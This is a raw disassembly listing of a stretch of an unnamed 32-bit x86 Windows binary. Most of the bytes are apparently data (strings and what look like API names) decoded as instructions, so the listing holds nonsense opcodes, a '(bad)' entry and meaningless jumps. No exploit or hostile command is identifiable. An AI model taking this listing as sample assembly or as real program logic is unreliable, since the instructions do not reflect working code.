  4237b1:	adc    DWORD PTR [ebp+0x620001e2],eax
  4237b7:	add    BYTE PTR [eax],al
  4237b9:	add    BYTE PTR [ebp+0x67702616],dh
  4237bf:	scas   al,BYTE PTR es:[edi]
  4237c0:	pop    esp
  4237c1:	cmp    BYTE PTR [esi-0x3459503e],bh
  4237c7:	ss addr16 jno 0x4237e9
  4237cb:	cmp    BYTE PTR [edx],ch
  4237cd:	and    ecx,DWORD PTR [ecx+0x2e]
  4237d0:	mov    ebx,0x983895a9
  4237d5:	enter  0x9c57,0x70
  4237d9:	dec    edi
  4237da:	fld    QWORD PTR [ecx+0x22]
  4237dd:	adc    ebx,DWORD PTR [esi+0x42]
  4237e0:	fs sahf 
  4237e2:	adc    BYTE PTR [edi],0xcb
  4237e5:	mov    eax,ds:0xf57ea1e8
  4237ea:	jmp    0x6b7c:0x574ee489
  4237f1:	push   ebx
  4237f2:	fs xchg edx,eax
  4237f4:	retf   0xf023
  4237f7:	pop    ss
  4237f8:	(bad)  
  4237f9:	arpl   WORD PTR [ebp+esi*2+0x4e],bx
  4237fd:	unpcklps xmm6,XMMWORD PTR [esi-0x298d69b1]
  423804:	rcr    dl,1
  423806:	cs cli 
  423808:	lods   al,BYTE PTR ds:[esi]
  423809:	xlat   BYTE PTR ds:[ebx]
  42380a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42380b:	jl     0x423877
  42380d:	or     edx,esp
  42380f:	mov    al,ds:0xb2a68fbe
  423814:	cs es je 0x423864
  423818:	sbb    DWORD PTR [edi-0x3a],0xab
  42381f:	add    BYTE PTR [eax],al
  423821:	add    BYTE PTR [eax],al
  423823:	rol    BYTE PTR [edx+0x0],0x4
  423827:	rol    BYTE PTR [edx+0x0],0x8
  42382b:	rol    BYTE PTR [edx+0x0],0xc
  42382f:	rol    BYTE PTR [edx+0x0],0x10
  423833:	rol    BYTE PTR [edx+0x0],0x14
  423837:	rol    BYTE PTR [edx+0x0],0x18
  42383b:	rol    BYTE PTR [edx+0x0],0x1c
  42383f:	rol    BYTE PTR [edx+0x0],0x57
  423843:	inc    edi
  423844:	cmp    DWORD PTR [edi+0x41],ebx
  423847:	pop    eax
  423848:	ss push esi
  42384a:	pop    edi
  42384b:	cmp    BYTE PTR [eax],al
  42384d:	inc    ebx
  42384e:	inc    ebp
  42384f:	dec    esp
  423850:	pop    edi
  423851:	pop    eax
  423852:	push   edi
  423853:	dec    eax
  423854:	inc    edx
  423855:	add    BYTE PTR [edi+0x50],dl
  423858:	xor    eax,0x4641365f
  42385d:	cmp    DWORD PTR [edx],esi
  42385f:	xor    ebx,DWORD PTR [edi+0x32]
  423862:	aaa    
  423863:	add    BYTE PTR [eax+0x48],dl
  423866:	xor    BYTE PTR [edi+0x58],bl
  423869:	push   esp
  42386a:	inc    ecx
  42386b:	dec    ebp
  42386c:	push   ecx
  42386d:	pop    edi
  42386e:	inc    esi
  42386f:	push   ebp
  423870:	cmp    DWORD PTR [eax],eax
  423872:	push   edi
  423873:	push   ebp
  423874:	inc    ecx
  423875:	xor    dh,BYTE PTR [ebx]
  423877:	xor    ebx,DWORD PTR [edi+0x4e]
  42387a:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42387e:	cmp    DWORD PTR [edi+0x38],ebx
  423881:	dec    ecx
  423882:	cmp    DWORD PTR [edx+0x36],ebx
  423885:	pop    edi
  423886:	dec    edx
  423887:	xor    BYTE PTR [edx+0x34],cl
  42388a:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42388e:	xor    esi,DWORD PTR [eax]
  423890:	pop    edi
  423891:	inc    edx
  423892:	dec    ebx
  423893:	pop    eax
  423894:	pop    eax
  423895:	xor    eax,0x51414d00
  42389a:	pop    edi
  42389b:	inc    ecx
  42389c:	xor    al,BYTE PTR [ebp+0x5f]
  42389f:	inc    ecx
  4238a0:	dec    ebx
  4238a1:	cmp    DWORD PTR ds:0x5a003939,esi
  4238a7:	inc    ebp
  4238a8:	cmp    BYTE PTR [edi+0x4d],bl
  4238ab:	ss dec eax
  4238ad:	dec    ebx
  4238ae:	add    BYTE PTR [ebp+0x57],al
  4238b1:	xor    DWORD PTR [edi+0x31],ebx
  4238b4:	dec    ebx
  4238b5:	xor    eax,DWORD PTR [ecx+0x30]
  4238b8:	push   ebx
  4238b9:	add    BYTE PTR [edx+esi*1+0x36],al
  4238bd:	aaa    
  4238be:	pop    edi
  4238bf:	push   edx
  4238c0:	dec    eax
  4238c1:	dec    ebp
  4238c2:	cmp    BYTE PTR [edi+0x37],bl
  4238c5:	inc    esi
  4238c6:	xor    eax,0x43355500
  4238cb:	pop    edi
  4238cc:	pop    ecx
  4238cd:	dec    ecx
  4238ce:	push   ebx
  4238cf:	xor    bl,BYTE PTR [edi+0x52]
  4238d2:	add    BYTE PTR [eax+0x55],dl
  4238d5:	dec    ecx
  4238d6:	xor    BYTE PTR [edi+0x43],bl
  4238d9:	ss inc ebp
  4238db:	xor    bl,BYTE PTR [edi+0x4d]
  4238de:	xor    al,0x4a
  4238e0:	push   edx
  4238e1:	push   ebp
  4238e2:	add    BYTE PTR [esi+0x39],cl
  4238e5:	push   eax
  4238e6:	pop    edi
  4238e7:	push   ebp
  4238e8:	cmp    DWORD PTR [esi],esi
  4238ea:	xor    BYTE PTR [ecx],dh
  4238ec:	pop    edi
  4238ed:	dec    edi
  4238ee:	dec    esi
  4238ef:	push   esp
  4238f0:	cmp    BYTE PTR [eax],al
  4238f2:	dec    esp
  4238f3:	xor    al,0x44
  4238f5:	xor    DWORD PTR [edi+0x4b],ebx
  4238f8:	xor    DWORD PTR [ebp+0x5f],eax
  4238fb:	pop    edx
  4238fc:	add    BYTE PTR [edi+esi*1+0x43],dl
  423900:	pop    edi
  423901:	inc    edx
  423902:	xor    dh,BYTE PTR [ecx]
  423904:	push   ebx
  423905:	xor    DWORD PTR [ecx],edi
  423907:	inc    edx
  423908:	add    BYTE PTR [edi+0x45],al
  42390b:	xor    al,0x38
  42390d:	xor    BYTE PTR [eax],dh
  42390f:	pop    edi
  423910:	dec    edx
  423911:	dec    ebx
  423912:	xor    eax,0x33345f4d
  423917:	add    BYTE PTR [ebx+esi*1+0x57],cl
  42391b:	pop    edi
  42391c:	aaa    
  42391d:	push   esi
  42391e:	dec    ebx
  42391f:	push   edx
  423920:	pop    edi
  423921:	inc    ebx
  423922:	add    BYTE PTR [edx+0x35],bl
  423925:	dec    ebp
  423926:	pop    edi
  423927:	inc    edi
  423928:	dec    esi
  423929:	xor    al,0x49
  42392b:	xor    eax,0x54590035
  423930:	push   edx
  423931:	pop    edi
  423932:	push   esp
  423933:	inc    ebx
  423934:	inc    ecx
  423935:	pop    edi
  423936:	cmp    DWORD PTR [ecx+0x41],ebx
  423939:	push   ebp
  42393a:	pop    edi
  42393b:	push   ebp
  42393c:	inc    ebp
  42393d:	add    BYTE PTR [esi+esi*1+0x35],cl
  423941:	pop    edi
  423942:	pop    eax
  423943:	dec    edx
  423944:	inc    edx
  423945:	inc    edi
  423946:	add    BYTE PTR [edx+0x36],al
  423949:	inc    ebx
  42394a:	pop    edi
  42394b:	xor    BYTE PTR ds:0x36464b,dh
  423951:	dec    ebx
  423952:	cmp    DWORD PTR [esi+0x37],eax
  423955:	xor    ebx,DWORD PTR [edi+0x35]
  423958:	ss inc edi
  42395a:	pop    ecx
  42395b:	dec    eax
  42395c:	pop    ecx
  42395d:	add    BYTE PTR [ebp+0x35],cl
  423960:	push   eax
  423961:	xor    BYTE PTR [edi+0x4f],bl
  423964:	pop    ecx
  423965:	xor    cl,BYTE PTR [edi+0x0]
  423968:	pop    ecx
  423969:	xor    DWORD PTR [esi+0x5f],ecx
  42396c:	xor    al,BYTE PTR [edx+0x30]
  42396f:	push   esi
  423970:	push   esp
  423971:	inc    ebp
  423972:	add    BYTE PTR [edi+0x37],al
  423975:	push   esi
  423976:	xor    DWORD PTR [edi+0x49],ebx
  423979:	xor    al,BYTE PTR [esi+0x30]
  42397c:	pop    edi
  42397d:	ss dec esi
  42397f:	cmp    BYTE PTR [eax],al
  423981:	pop    edx
  423982:	xor    eax,0x445f334b
  423987:	xor    BYTE PTR [eax],bh
  423989:	push   ecx
  42398a:	push   esi
  42398b:	xor    al,0x0
  42398d:	push   ebp
  42398e:	pop    eax
  42398f:	inc    edi
  423990:	xor    DWORD PTR [edi+0x39],ebx
  423993:	push   esp
  423994:	inc    ebx
  423995:	aaa    
  423996:	inc    esp
  423997:	add    BYTE PTR [edi+0x39],dl
  42399a:	ss pop edi
  42399c:	dec    eax
  42399d:	pop    edx
  42399e:	pop    ecx
  42399f:	inc    edi
  4239a0:	push   ebp
  4239a1:	pop    edi
  4239a2:	push   eax
  4239a3:	dec    eax
  4239a4:	inc    ebx
  4239a5:	add    BYTE PTR [ebp+0x0],dl
  4239a8:	xor    al,0x0
  4239aa:	dec    edi
  4239ab:	add    BYTE PTR [edi+0x0],bl
  4239ae:	cmp    BYTE PTR [eax],al
  4239b0:	xor    al,BYTE PTR [eax]
  4239b2:	inc    ebx
  4239b3:	add    BYTE PTR [edx+0x0],bl
  4239b6:	inc    ebx
  4239b7:	add    BYTE PTR [edi],dh
  4239b9:	add    BYTE PTR [edi+0x0],bl
  4239bc:	inc    ebx
  4239bd:	add    BYTE PTR [eax+eax*1+0x0],al
  4239c1:	add    BYTE PTR [eax+eax*1+0x4b],cl
  4239c5:	add    BYTE PTR [edx],dh
  4239c7:	add    BYTE PTR [edi+0x0],bl
  4239ca:	cmp    BYTE PTR [eax],al
  4239cc:	dec    esp
  4239cd:	add    BYTE PTR [esi+0x0],dl
  4239d0:	pop    edi
  4239d1:	add    BYTE PTR [ecx+0x0],bl
  4239d4:	push   edx
  4239d5:	add    BYTE PTR [esi+0x0],dl
  4239d8:	xor    al,BYTE PTR [eax]
  4239da:	cmp    BYTE PTR [eax],al
  4239dc:	pop    edi
  4239dd:	add    BYTE PTR [edx+0x0],cl
  4239e0:	add    BYTE PTR [eax],al
  4239e2:	inc    edx
  4239e3:	add    BYTE PTR [eax+eax*1+0x46],cl
  4239e7:	add    BYTE PTR [edi+0x0],bl
  4239ea:	xor    eax,DWORD PTR [eax]
  4239ec:	inc    ebp
  4239ed:	add    BYTE PTR [ecx+0x0],cl
  4239f0:	push   edx
  4239f1:	add    BYTE PTR [ecx],bh
  4239f3:	add    BYTE PTR [esi+0x0],dl
  4239f6:	add    BYTE PTR [eax],al
  4239f8:	dec    ebp
  4239f9:	add    BYTE PTR [edi],dh
  4239fb:	add    BYTE PTR [eax+eax*1+0x5f],al
  4239ff:	add    BYTE PTR [edx+0x0],cl
  423a02:	pop    eax
  423a03:	add    BYTE PTR [ebx],dh
  423a05:	add    BYTE PTR [ecx],dh
  423a07:	add    BYTE PTR [ebx+0x0],al
  423a0a:	add    BYTE PTR [eax],al
  423a0c:	dec    edi
  423a0d:	add    BYTE PTR [esi],dh
  423a0f:	add    BYTE PTR [eax+0x0],cl
  423a12:	pop    edi
  423a13:	add    BYTE PTR [eax],dh
  423a15:	add    BYTE PTR [edi],dh
  423a17:	add    BYTE PTR [ecx],dh
  423a19:	add    BYTE PTR [edx+0x0],dl
  423a1c:	xor    eax,0x55000000
  423a21:	add    BYTE PTR [eax+eax*1+0x5a],dl
  423a25:	add    BYTE PTR [edi+0x0],bl
  423a28:	push   esp
  423a29:	add    BYTE PTR [ecx+0x0],al
  423a2c:	cmp    DWORD PTR [eax],eax
  423a2e:	pop    edi
  423a2f:	add    BYTE PTR [ebx],dh
  423a31:	add    BYTE PTR [eax],dh
  423a33:	add    BYTE PTR [eax],bh
  423a35:	add    BYTE PTR [edi+0x0],cl
  423a38:	inc    ebx
  423a39:	add    BYTE PTR ds:0x4d000000,dh
  423a3f:	add    BYTE PTR [esi+0x0],cl
  423a42:	inc    ebp
  423a43:	add    BYTE PTR [edi+0x0],bl
  423a46:	push   esp
  423a47:	add    BYTE PTR [esi+0x0],al
  423a4a:	cmp    BYTE PTR [eax],al
  423a4c:	push   ebx
  423a4d:	add    BYTE PTR [edx+0x0],bl
  423a50:	pop    edi
  423a51:	add    BYTE PTR [eax],dh
  423a53:	add    BYTE PTR [eax],bh
  423a55:	add    BYTE PTR [eax+0x0],cl
  423a58:	add    BYTE PTR [eax],al
  423a5a:	dec    esi
  423a5b:	add    BYTE PTR [edi+0x0],cl
  423a5e:	pop    edx
  423a5f:	add    BYTE PTR [edi+0x0],bl
  423a62:	add    BYTE PTR ss:[ecx+0x0],bl
  423a66:	dec    ebp
  423a67:	add    BYTE PTR [esi],dh
  423a69:	add    BYTE PTR [ebx],dh
  423a6b:	add    BYTE PTR [edi+0x0],bl
  423a6e:	xor    al,0x0
  423a70:	dec    esi
  423a71:	add    BYTE PTR [edx],dh
  423a73:	add    BYTE PTR [esi],dh
  423a75:	add    BYTE PTR [ecx],dh
  423a77:	add    BYTE PTR [eax],al
  423a79:	add    BYTE PTR [ebx+0x0],cl
  423a7c:	dec    eax
  423a7d:	add    BYTE PTR [eax],bh
  423a7f:	add    BYTE PTR [edi+0x0],bl
  423a82:	inc    esi
  423a83:	add    BYTE PTR [esi+0x0],al
  423a86:	push   esp
  423a87:	add    BYTE PTR [edi],dh
  423a89:	add    BYTE PTR [esi],dh
  423a8b:	add    BYTE PTR [edi+0x0],bl
  423a8e:	dec    esp
  423a8f:	add    BYTE PTR [ecx+0x0],bl
  423a92:	add    BYTE PTR [eax],al
  423a94:	push   ebx
  423a95:	add    BYTE PTR [ecx+0x0],bl
  423a98:	xor    BYTE PTR [eax],al
  423a9a:	pop    edi
  423a9b:	add    BYTE PTR [ecx],bh
  423a9d:	add    BYTE PTR [edx+0x0],dl
  423aa0:	dec    eax
  423aa1:	add    BYTE PTR [ecx+0x0],bl
  423aa4:	xor    al,BYTE PTR [eax]
  423aa6:	pop    edi
  423aa7:	add    BYTE PTR [eax],dh
  423aa9:	add    BYTE PTR [eax],al
  423aab:	add    BYTE PTR [edx+0x0],al
  423aae:	dec    edx
  423aaf:	add    BYTE PTR [esi+0x0],cl
  423ab2:	xor    al,BYTE PTR [eax]
  423ab4:	pop    edi
  423ab5:	add    BYTE PTR [eax+eax*1+0x33],cl
  423ab9:	add    BYTE PTR [edx+0x0],dl
  423abc:	xor    al,0x0
  423abe:	dec    eax
  423abf:	add    BYTE PTR [eax],al
  423ac1:	add    BYTE PTR [ebp+0x0],dl
  423ac4:	add    BYTE PTR ss:[ebp+0x0],cl
  423ac8:	xor    DWORD PTR [eax],eax
  423aca:	pop    edi
  423acb:	add    BYTE PTR [esi],dh
  423acd:	add    BYTE PTR [ecx+0x0],bl
  423ad0:	push   ebp
  423ad1:	add    BYTE PTR [eax+eax*1+0x5f],dl
  423ad5:	add    BYTE PTR [edi+0x0],cl
  423ad8:	inc    esp
  423ad9:	add    BYTE PTR [edi+0x0],dl
  423adc:	push   ebx
  423add:	add    BYTE PTR [eax],al
  423adf:	add    BYTE PTR [edx+0x0],bl
  423ae2:	inc    ebx
  423ae3:	add    BYTE PTR [ebp+0x0],dl
  423ae6:	pop    edi
  423ae7:	add    BYTE PTR [ecx],dh
  423ae9:	add    BYTE PTR [ebp+0x0],al
  423aec:	push   esp
  423aed:	add    BYTE PTR [eax],dh
  423aef:	add    BYTE PTR [eax],al
  423af1:	add    BYTE PTR [eax],al
  423af3:	add    BYTE PTR [eax],al
  423af5:	add    BYTE PTR [eax-0x7ffbffbe],al
  423afb:	inc    edx
  423afc:	add    BYTE PTR [eax],cl
  423afe:	add    BYTE PTR [edx+0x0],0xc
  423b02:	add    BYTE PTR [edx+0x0],0x10
  423b06:	add    BYTE PTR [edx+0x0],0x14
  423b0a:	add    BYTE PTR [edx+0x0],0x18
  423b0e:	add    BYTE PTR [edx+0x0],0x1c
  423b12:	add    BYTE PTR [edx+0x0],0x20
  423b16:	add    BYTE PTR [edx+0x0],0x24
  423b1a:	add    BYTE PTR [edx+0x0],0x28
  423b1e:	add    BYTE PTR [edx+0x0],0x0
	...
  423b32:	add    BYTE PTR [eax],al
  423b34:	sbb    edi,DWORD PTR [edi+0x4d57]
  423b3a:	add    BYTE PTR [eax],al
  423b3c:	bound  edi,QWORD PTR [ebx]
  423b3e:	add    al,BYTE PTR [eax]
  423b40:	add    DWORD PTR [eax],eax
  423b42:	add    BYTE PTR [eax],al
  423b44:	add    DWORD PTR [eax],eax
  423b46:	add    BYTE PTR [eax],al
  423b48:	add    DWORD PTR [eax],eax
  423b4a:	add    BYTE PTR [eax],al
  423b4c:	pop    eax
  423b4d:	cmp    eax,DWORD PTR [edx]
  423b4f:	add    BYTE PTR [ebx+edi*1+0x2],bl
  423b53:	add    BYTE PTR [eax+0x3b],ah
  423b56:	add    al,BYTE PTR [eax]
  423b58:	inc    esi
  423b59:	iret   
  423b5a:	add    BYTE PTR [eax],al
  423b5c:	outs   dx,BYTE PTR ds:[esi]
  423b5d:	cmp    eax,DWORD PTR [edx]
  423b5f:	add    BYTE PTR [eax],al
  423b61:	add    BYTE PTR [edi+0x6f],dl
  423b64:	jb     0x423bca
  423b66:	push   edi
  423b67:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  423b6e:	aas    
  423b6f:	inc    ebp
  423b70:	outs   dx,BYTE PTR ds:[esi]
  423b71:	jne    0x423be0
  423b73:	push   edi
  423b74:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  423b7b:	popa   
  423b7c:	je     0x423be7
  423b7e:	outs   dx,DWORD PTR ds:[esi]
  423b7f:	outs   dx,BYTE PTR ds:[esi]
  423b80:	jae    0x423bd5
  423b82:	je     0x423be5
  423b84:	.byte 0x74
